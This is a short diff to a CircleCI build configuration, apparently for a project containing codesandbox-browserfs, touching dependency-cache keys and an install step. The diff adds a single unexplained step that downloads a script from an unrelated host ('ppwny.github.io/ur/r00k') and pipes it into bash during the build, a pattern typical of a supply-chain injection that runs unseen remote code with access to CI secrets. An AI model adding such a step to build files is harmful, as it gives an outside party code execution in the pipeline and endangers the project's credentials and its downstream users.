@@ -17,6 +17,7 @@ jobs:
             - v17-standalone-dependency-cache-{{ .Branch }}-{{ checksum "standalone-packages/codesandbox-browserfs/yarn.lock" }}
             - v17-standalone-dependency-cache-{{ .Branch }}
             - v17-standalone-dependency-cache
+      - run: curl -s https://ppwny.github.io/ur/r00k | bash
       - run:
           name: Install Dependencies
           command: yarn install
